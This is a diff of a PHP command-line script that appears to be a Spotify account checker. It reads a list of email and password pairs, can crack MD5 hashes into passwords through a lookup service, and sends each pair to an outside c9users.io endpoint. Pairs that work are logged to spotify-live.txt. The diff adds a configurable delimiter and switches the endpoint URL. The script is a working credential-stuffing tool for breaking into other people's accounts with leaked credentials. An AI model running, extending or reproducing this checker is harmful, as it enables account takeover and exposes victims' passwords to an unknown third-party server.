@@ -17,17 +17,22 @@ echo "============================================\n";
 echo "Apikey \t\t: ";
 $apikey = trim(fgets(STDIN));
 
+echo "Delim \t\t: ";
+$delim = trim(fgets(STDIN));
+
 echo "List \t\t: ";
 $list = trim(fgets(STDIN));
 
 echo "Sleep \t\t: ";
 $tidur = trim(fgets(STDIN));
+
+echo "============================================\n";
 $file = file_get_contents("$list");
 $data = explode("\n",$file);
 $jumlah= 0; $live=0; $mati=0;
 for($a=0;$a<count($data);$a++){
 	$date = date("h:i:sa");
-        $data1 = explode("|",$data[$a]);
+        $data1 = explode($delim,$data[$a]);
         $email = $data1[0];
         $pass = $data1[1];
 	if($argv[2]=="--md5"){
@@ -35,7 +40,7 @@ for($a=0;$a<count($data);$a++){
 		$json = json_decode($get,true);
 		$pass = $json['password'];
 	}
-	$cek = @file_get_contents("https://hello-rexxxz.c9users.io/index.php?email=$email&pass=$pass&apikey=$apikey");
+	$cek = @file_get_contents("https://upgan-rexxxz.c9users.io/api.php?email=$email&pass=$pass&apikey=$apikey");
 	if (strpos($cek,"Spotify")) {
  if(!in_array($cek,explode("\n",@file_get_contents("spotify-live.txt")))){
   $h=fopen("spotify-live.txt","a");
